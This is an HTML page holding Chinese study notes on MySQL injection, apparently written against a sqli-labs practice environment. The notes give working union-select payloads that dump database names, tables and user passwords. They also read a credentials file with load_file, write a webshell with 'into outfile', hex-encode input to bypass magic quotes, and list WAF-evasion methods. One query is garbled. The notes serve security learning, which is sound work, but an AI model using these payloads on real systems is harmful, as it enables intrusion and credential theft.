@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Day13web漏洞-SQL注入之MySQL注入 | Fourth Street</title><meta name="keywords" content="小迪安全"><meta name="author" content="四号街1395"><meta name="copyright" content="四号街1395"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL的一般流程步骤 MySQL注入普通流程  必要知识点：在MySQL5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。 数据库中符号“.”表示下一级，如shj1395.wenwen表示shj1395数据库下wenwen表名   ​				infor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day13web漏洞-SQL注入之MySQL注入">
+<meta property="og:url" content="http://shj1395.top/2022/04/16/day13web-lou-dong-sql-zhu-ru-zhi-mysql-zhu-ru/index.html">
+<meta property="og:site_name" content="Fourth Street">
+<meta property="og:description" content="SQL的一般流程步骤 MySQL注入普通流程  必要知识点：在MySQL5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。 数据库中符号“.”表示下一级，如shj1395.wenwen表示shj1395数据库下wenwen表名   ​				infor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p.ananas.chaoxing.com/star3/origin/a7421262a6046a1acf0e94cc20030e1a.png">
+<meta property="article:published_time" content="2022-04-15T18:30:57.000Z">
+<meta property="article:modified_time" content="2022-05-31T14:21:02.908Z">
+<meta property="article:author" content="四号街1395">
+<meta property="article:tag" content="小迪安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p.ananas.chaoxing.com/star3/origin/a7421262a6046a1acf0e94cc20030e1a.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://shj1395.top/2022/04/16/day13web-lou-dong-sql-zhu-ru-zhi-mysql-zhu-ru/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day13web漏洞-SQL注入之MySQL注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-05-31 22:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/xiugai.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/111.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://p.ananas.chaoxing.com/star3/origin/a7421262a6046a1acf0e94cc20030e1a.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fourth Street</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day13web漏洞-SQL注入之MySQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-15T18:30:57.000Z" title="发表于 2022-04-16 02:30:57">2022-04-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-31T14:21:02.908Z" title="更新于 2022-05-31 22:21:02">2022-05-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">渗透之路</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day13web漏洞-SQL注入之MySQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://i0.hdslb.com/bfs/article/b80842ff4b92372e7e633b1667ee5a60080e8d78.png@831w_1218h_progressive.webp" alt="SQL注入"></p>
+<h1 id="SQL的一般流程步骤"><a href="#SQL的一般流程步骤" class="headerlink" title="SQL的一般流程步骤"></a>SQL的一般流程步骤</h1><ol>
+<li><h2 id="MySQL注入普通流程"><a href="#MySQL注入普通流程" class="headerlink" title="MySQL注入普通流程"></a>MySQL注入普通流程</h2><blockquote>
+<ol>
+<li>必要知识点：在MySQL5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。</li>
+<li>数据库中符号“.”表示下一级，如shj1395.wenwen表示shj1395数据库下wenwen表名</li>
+</ol>
+</blockquote>
+<p>​				information_schema.tables;    –记录所有表名信息的表</p>
+<p>​				information_schema.columns;    –记录所有列名信息的表</p>
+<p>​				table_name;    表名</p>
+<p>​				column_name;    列名</p>
+<p>​				table_shcema;    数据库名</p>
+<ul>
+<li><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><ol>
+<li><h3 id="数据库版本-version-–5-5-44-0ubuntu0-14-04-1"><a href="#数据库版本-version-–5-5-44-0ubuntu0-14-04-1" class="headerlink" title="数据库版本 version()    –5.5.44-0ubuntu0.14.04.1"></a>数据库版本 version()    –5.5.44-0ubuntu0.14.04.1</h3></li>
+<li><h3 id="数据库名字database-–security"><a href="#数据库名字database-–security" class="headerlink" title="数据库名字database()    –security"></a>数据库名字database()    –security<img src="https://p.ananas.chaoxing.com/star3/origin/4d3bda5af0ce0c3e2f285301abdcc391.png"></h3></li>
+<li><h3 id="数据库用户user-root-localhost"><a href="#数据库用户user-root-localhost" class="headerlink" title="数据库用户user()    --root@localhost"></a>数据库用户user()    --root@localhost</h3></li>
+<li><h3 id="操作系统-version-compile-os-–debian-linux-gnu"><a href="#操作系统-version-compile-os-–debian-linux-gnu" class="headerlink" title="操作系统@@version_compile_os    –debian-linux-gnu"></a>操作系统@@version_compile_os    –debian-linux-gnu<img src="https://p.ananas.chaoxing.com/star3/origin/4d4b580d1bd07ccf7a78f07e622ba2f0.png"></h3></li>
+</ol>
+</li>
+<li><h2 id="判断是否存在注入点–输入id-x3D-1qqq查询报错，存在注入漏洞"><a href="#判断是否存在注入点–输入id-x3D-1qqq查询报错，存在注入漏洞" class="headerlink" title="判断是否存在注入点–输入id=1qqq查询报错，存在注入漏洞"></a>判断是否存在注入点–输入id=1qqq查询报错，存在注入漏洞<img src="https://p.ananas.chaoxing.com/star3/origin/802863497a005adf4b1fbde751304af4.png"></h2></li>
+<li><h2 id="判断列数–id-x3D-1-order-by-4-报错说明存在3列"><a href="#判断列数–id-x3D-1-order-by-4-报错说明存在3列" class="headerlink" title="判断列数–id=1 order by 4 报错说明存在3列"></a>判断列数–id=1 order by 4 报错说明存在3列<img src="https://p.ananas.chaoxing.com/star3/origin/17cbde6eaa69856e94f77da0ef88fd1d.png"></h2></li>
+<li><h2 id="联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）"><a href="#联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）" class="headerlink" title="联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）"></a>联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）<img src="https://p.ananas.chaoxing.com/star3/origin/67fa1f0b1e4a79c528c024890892df40.png"></h2></li>
+<li><h2 id="利用union联合查询指定数据库名下面的表名信息（group-concat-数据以组的形式显示出来）"><a href="#利用union联合查询指定数据库名下面的表名信息（group-concat-数据以组的形式显示出来）" class="headerlink" title="利用union联合查询指定数据库名下面的表名信息（group_concat()数据以组的形式显示出来）"></a>利用union联合查询指定数据库名下面的表名信息（group_concat()数据以组的形式显示出来）</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/420f7a937b994f096df6c31f3796fc39.png"></p>
+</li>
+<li><h2 id="查询指定数据库名、表名，下面的列名信息"><a href="#查询指定数据库名、表名，下面的列名信息" class="headerlink" title="查询指定数据库名、表名，下面的列名信息"></a>查询指定数据库名、表名，下面的列名信息</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security'
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/94d3718daa4d4cefb8c0cc4f114a76ef.png"></p>
+</li>
+<li><h2 id="查询用户名和密码"><a href="#查询用户名和密码" class="headerlink" title="查询用户名和密码"></a>查询用户名和密码</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(usernamegroup_concat(password) from security.users
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/16eccd44b9895752f82e0cc7b9e66fc7.png"></p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="DAY13补充"><a href="#DAY13补充" class="headerlink" title="DAY13补充"></a>DAY13补充</h1><p><img src="https://p.ananas.chaoxing.com/star3/origin/24410f25601c00c90654df4f28bee4a8.png"></p>
+<ol>
+<li><h2 id="跨库查询的知识点"><a href="#跨库查询的知识点" class="headerlink" title="跨库查询的知识点"></a>跨库查询的知识点</h2><ul>
+<li>​	MySQL数据库（MySQL -u root -p）</li>
+<li>数据库1==网站a=数据库用户a</li>
+<li>数据库2==网站b=数据库用户</li>
+<li>数据库3==网站c—</li>
+</ul>
+<blockquote>
+<p>​	information_schema 表特性，记录库名，表名，列名对应表</p>
+<p>​    Information_schema.tables:记录所有表名信息的表</p>
+<p>​	Information_schema.columns：记录所有列名信息的表</p>
+<p>​	schemata：记录所有数据库名的表 –列名为schema_name</p>
+<p>​	table_schema:数据库名</p>
+<p>​	Table_name:表名</p>
+<p>​	Column_name:列名 </p>
+</blockquote>
+</li>
+<li><h2 id="利用information-schema-schemata查询所有数据库"><a href="#利用information-schema-schemata查询所有数据库" class="headerlink" title="利用information_schema.schemata查询所有数据库"></a>利用information_schema.schemata查询所有数据库</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/dfc253bf7d35afdb6139672e99b84c60.png"></p>
+</li>
+<li><h2 id="查询指定MySQL数据库下的所有表"><a href="#查询指定MySQL数据库下的所有表" class="headerlink" title="查询指定MySQL数据库下的所有表"></a>查询指定MySQL数据库下的所有表</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='mysql'
+</code></pre>
+<p><img src="/Day13web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMySQL%E6%B3%A8%E5%85%A5/d136fe857c1236485e184f998abbacd2.png"></p>
+</li>
+<li><h2 id="查询指定表users下面的所有列"><a href="#查询指定表users下面的所有列" class="headerlink" title="查询指定表users下面的所有列"></a>查询指定表users下面的所有列</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user' and table_schema='mysql'
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/c0bfd515b6952f41001969740ce57f07.png"></p>
+</li>
+<li><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,group_concat(user),group_concat(password) from mysql.user
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/5e6d5402384b9b68d4a967bbdb2a91a1.png"></p>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/2d8c45e80717e8c54395a38075f301e3.png"></p>
+<h1 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h1><blockquote>
+<ul>
+<li><p>load_file():读取函数</p>
+</li>
+<li><p>into outfile或 into dumpfile  :导出函数</p>
+</li>
+<li><p>MYSQL新特性secure_file_priv对读写文件的影响<br>此开关默认为NULL，即不允许导入导出。</p>
+<p>解决问题:<br>windows下：</p>
+<p>修改my.ini 在[mysqld]内加入secure_file_priv=</p>
+<p>linux下：</p>
+<p>修改my.cnf 在[mysqld]内加入secure_file_priv=<br>MYSQL新特性secure_file_priv对读写文件的影响<br>然后重启mysql，再查询secure_file_priv<img src="https://p.ananas.chaoxing.com/star3/origin/c49b8081d2dbbe7df95424be432b9783.png"></p>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><h2 id="load-file-‘’-读取函数的应用"><a href="#load-file-‘’-读取函数的应用" class="headerlink" title="load_file(‘’)读取函数的应用"></a>load_file(‘’)读取函数的应用</h2></li>
+</ol>
+<pre class=" language-mysql"><code class="language-mysql">union select 1,load_file('D:\\phpStudy\\WWW\\sqli\\sql-connections\\db-creds.inc')
+</code></pre>
+<p><strong>这里文件路径需要拿引号 ’ 括起来，“\\”的作用是为了防止转义，是计算机知道这个确实是斜杠而已。</strong><img src="https://p.ananas.chaoxing.com/star3/origin/9775f94ddb0d23c5601450b4d180af40.png"></p>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/a0d213054f204b4c566ef92326b9a972.png"></p>
+<p>路径获取的常见方法</p>
+<ul>
+<li>报错显示：网站在出现错误的时候会显示网站路径<img src="https://i0.hdslb.com/bfs/article/c9f3c1b09f5f287b672456bb903909e21573478d.png@831w_249h_progressive.webp"></li>
+<li>遗留文件：类似于phpinfo文件，SCRIPT_FILENAME—脚本文件地址 <img src="https://i0.hdslb.com/bfs/article/f123038a955556137077e5fe144ae6984ca1a9d3.png@831w_303h_progressive.webp"></li>
+<li>漏洞报错：查找网站对应组件的漏洞找寻有效的信息，word press zblog等博客搭建平台的漏洞等等</li>
+<li>平台配置文件（存放位置不绝对导致实用）：搭建平台配置文件（一般都有默认的路径）记录有网站的配置信息</li>
+<li>爆破等：</li>
+</ul>
+<ol start="2">
+<li><h2 id="into-outfile-和-into-dumpfile函数的应用（可以上传一句话木马）"><a href="#into-outfile-和-into-dumpfile函数的应用（可以上传一句话木马）" class="headerlink" title="into outfile 和 into dumpfile函数的应用（可以上传一句话木马）"></a>into outfile 和 into dumpfile函数的应用（可以上传一句话木马）</h2></li>
+</ol>
+<pre class=" language-mysql"><code class="language-mysql">id=-1 union select 1,'要上传的代码什么的',3 into outfile '写入的绝对路径' --+注释符
+</code></pre>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/5863054c63a733296b620d840efc08b7.png"></p>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/933a76e8ff19bd1ed887cf6e613a9990.png"></p>
+<h1 id="魔术引号及常见防护-（magic-quotes-gpc-x3D-）"><a href="#魔术引号及常见防护-（magic-quotes-gpc-x3D-）" class="headerlink" title="魔术引号及常见防护 （magic_quotes_gpc =）"></a>魔术引号及常见防护 （magic_quotes_gpc =）</h1><blockquote>
+<p><strong>magic_quotes_gpc = 函数</strong></p>
+<p>当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。<br>php中的magic_quotes_gpc是配置在php.ini中的</p>
+</blockquote>
+<p><img src="https://i0.hdslb.com/bfs/article/cdaa128cf2bcff49c0d1af266026ad7e3527995c.png@831w_263h_progressive.webp"></p>
+<p>打开了魔术引号在执行</p>
+<p><code>id=-1%20union%20select%201,load_file(%27D:\\phpStudy\\WWW\\sqli\\sql-connections\\db-creds.inc%27),3</code></p>
+<p>发现语句变成了</p>
+<p><code>id=-1 union select 1,load_file(\'D:\\\\phpStudy\\\\WWW\\\\sqli\\\\sql-connections\\\\db-creds.inc\'),3</code></p>
+<p>可以发现，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。如图。<img src="https://p.ananas.chaoxing.com/star3/origin/7751fa2fb5ca6a975f7f56a4e4015c35.png"></p>
+<p>绕过办法—使用编码把包含函数过滤的字符进行编码达到目</p>
+<p>把路径进行编码（<strong>编码的时候单引号可以省略了</strong>）D:\phpStudy\WWW\sqli\sql-connections\db-creds.inc</p>
+<p><code>0x443A5C5C70687053747564795C5C5757575C5C73716C695C5C73716C2D636F6E6E656374696F6E735C5C64622D63726564732E696E63</code></p>
+<p><img src="https://p.ananas.chaoxing.com/star3/origin/ce1ad4740fda609a9bc54ebc1619198d.png"></p>
+<p>这里可以看到注入成功了</p>
+<h2 id="addslashes-函数-和-is-int函数"><a href="#addslashes-函数-和-is-int函数" class="headerlink" title="addslashes()函数 和 is_int函数"></a>addslashes()函数 和 is_int函数</h2><ol>
+<li>addslashes()函数</li>
+</ol>
+<p><img src="https://i0.hdslb.com/bfs/article/757ef0df975a20aaa1f8e9c9e50bcae16df09c20.png@744w_290h_progressive.webp"></p>
+<ol start="2">
+<li>is_int函数</li>
+</ol>
+<p>原代码<img src="https://i0.hdslb.com/bfs/article/0eb70f9544ae987b24231af5a0a050285cb3f2c8.png@773w_327h_progressive.webp"></p>
+<p>整数过滤代码<img src="https://i0.hdslb.com/bfs/article/9ab35c059541b38ab4ec7c77f4e347b7551d0789.png@831w_359h_progressive.webp"></p>
+<p>注入？？？—无法绕过，直接跑路。。。。。<img src="https://p.ananas.chaoxing.com/star3/origin/5fe7b7f4754b963ae1e10f282bdd9ecc.png"></p>
+<ol start="3">
+<li>过滤关键字— str_replace(‘被过滤参数’,’过滤参数’,$id)</li>
+</ol>
+<p><img src="https://i0.hdslb.com/bfs/article/6e6510372e24adf33d15dc47896e3805e0d2cc22.png@758w_308h_progressive.webp"></p>
+<p>​	过滤效果—select变成了fuck</p>
+<p><img src="https://i0.hdslb.com/bfs/article/9b87db1610bfbee32bf3487fe79cea03dd2bbe78.png@831w_219h_progressive.webp"></p>
+<ol start="4">
+<li>waf防护软件</li>
+</ol>
+<p>作用机制—过滤关键字</p>
+<p>绕过方法：</p>
+<ol>
+<li><p>更改提交方法</p>
+</li>
+<li><p>大小写混合</p>
+</li>
+<li><p>解密编码类</p>
+</li>
+<li><p>注释符号混用</p>
+</li>
+<li><p>等价函数替换</p>
+</li>
+<li><p>特殊符号混用</p>
+</li>
+<li><p>借助数据库特性</p>
+</li>
+<li><p>HTTP参数污染</p>
+</li>
+<li><p>垃圾数据溢出—waf只能匹配一千个，多了就不行了</p>
+<p><strong>低版本注入配合读取或暴力</strong></p>
+</li>
+</ol>
+<p>1.SQLmap工具—字典</p>
+<p>​	sqlmap文件—dicts.py文件</p>
+<p><img src="https://i0.hdslb.com/bfs/article/5b60315f1759c0eed88d95dbdaf708bbb191dca4.png@831w_563h_progressive.webp"></p>
+<ol start="2">
+<li><p>读取源代码的数据库查询语句</p>
+</li>
+<li><p>暴力猜解—admin，password，passwd,user,member,</p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="shj1395.top">四号街1395</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://shj1395.top/2022/04/16/day13web-lou-dong-sql-zhu-ru-zhi-mysql-zhu-ru/">http://shj1395.top/2022/04/16/day13web-lou-dong-sql-zhu-ru-zhi-mysql-zhu-ru/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">转载请注明来处！！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></div><div class="post_share"><div class="social-share" data-image="https://p.ananas.chaoxing.com/star3/origin/a7421262a6046a1acf0e94cc20030e1a.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/04/17/day14web-lou-dong-sql-zhu-ru-lei-xing-ji-ti-jiao-zhu-ru/"><img class="prev-cover" src="https://p.ananas.chaoxing.com/star3/origin/53ebda2a33aee1877e0e84622abda09c.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day14web漏洞-SQL注入类型及提交注入</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/14/tu-shou-po-jie-nessus-zui-xin-ban-xiang-xi-yan-shi/"><img class="next-cover" src="https://w.wallhaven.cc/full/pk/wallhaven-pkdol3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">徒手破解Nessus最新版详细演示</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/16/day12web-lou-dong-sql-zhu-ru-jian-yao/" title="Day12web漏洞-SQL注入简要"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/2d9ffa847935e0bc1eb746e85300b8fb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">Day12web漏洞-SQL注入简要</div></div></a></div><div><a href="/2022/03/16/day11web-lou-dong-bi-dong-zhi-shi-dian/" title="Day11web漏洞-必懂知识点"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/5990d04cd6367286ac29ed50066b08c6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">Day11web漏洞-必懂知识点</div></div></a></div><div><a href="/2022/04/17/day14web-lou-dong-sql-zhu-ru-lei-xing-ji-ti-jiao-zhu-ru/" title="Day14web漏洞-SQL注入类型及提交注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/53ebda2a33aee1877e0e84622abda09c.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">Day14web漏洞-SQL注入类型及提交注入</div></div></a></div><div><a href="/2022/04/20/day15web-lou-dong-sql-zhu-ru-zhi-oracle-mongodb-deng-zhu-ru/" title="Day15web漏洞-SQL注入之Oracle、mongodb等注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/f8f3ad61348547f33ae6478fb14b2550.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">Day15web漏洞-SQL注入之Oracle、mongodb等注入</div></div></a></div><div><a 